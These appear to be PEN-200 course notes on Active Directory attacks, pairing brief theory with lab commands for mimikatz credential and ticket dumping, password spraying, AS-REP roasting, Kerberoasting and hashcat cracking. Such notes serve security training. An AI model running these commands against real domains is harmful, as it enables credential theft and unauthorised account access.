# AD attacks from Pen-200

### Authentication types

1) ***NTLM authentication*** is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.

<br><br>

2) ***Kerberos client authentication*** involves the use of a domain controller in the role of a Key Distribution Center (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.

<br><br>
3) ***Cached credentials***
   
Extract cached credentials with mimikatz.exe.  If LSASS protection is not enabled.

- privilege::debug
- sekurlsa::logonpasswords

Extract TGS and TGT tickets with mimikatz.exe  
- sekurlsa::tickets

Authentication / smart card - extract certificates private keys even if marked secure.  

The crypto module contains the capability to either patch the CryptoAPI function with crypto::capi or KeyIso service with crypto::cng,making non-exportable keys exportable.


### Brute Force attacks

Gather password policy to determine lockout: ***net accounts***  

<br>

Use directory entry to brute force accounts.  Adjust username/password.

``` powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```
<br>

There is a script that contains this technique ***Spray-Passwords.ps1***

Kali has crackmapexec.  
-d for DOMAIN  
--continue-on-success  (Continue even if you find valid credentials)

``` bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
<br>

WINDOWS / LINUX have a tool called ***KERBRUTE*** to password spray  

``` 
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```


### AS-REP Roasting

**Theory**: Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response. This attack is known as AS-REP Roasting.

**Scanning**: To identify users with the enabled AD user account option Do not require Kerberos preauthentication, we can use PowerView's Get-DomainUser function with the option -PreauthNotRequired on Windows. On Kali, we can use impacket-GetNPUsers as shown in listing 14 without the -request and -outputfile options.

**Attack**:

Use **impacket-GetNPUsers** to perform AS-REP roasting. We'll need to enter the IP address of the domain controller as an argument for **-dc-ip**, the name of the output file in which the AS-REP hash will be stored in Hashcat format for **-outputfile**, and **-request** to request the TGT.

<br>
1) 

***Credentials are provided in this command, PETE/password supply by stdin***  
Linux:<br>

Search for users and gather their hashes with impacket-GetNPUsers

<br>

``` bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

Crack the AS-REP request:  <br>

2)
``` bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

<br>
Windows:<br>

On windows on the same domain, Rubeus will pass through logon session via kerberos.  

``` powershell
.\Rubeus.exe asreproast /nowrap
```
<br><br>

### Kerberoasting

**theory**: When a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller.  The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN.  The service ticket is encrypted using the SPN's password hash. If we can request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as Kerberoasting.  


**scanning**: Windows you can use rubeus.exe .\Rubeus.exe kerberoast /outfile:hashes.kerberoast.  On linux you can use impacket suite: sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete.  ***This command requires domain credentials for corp.com/pete***  

**Attack**:  

#### Windows

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
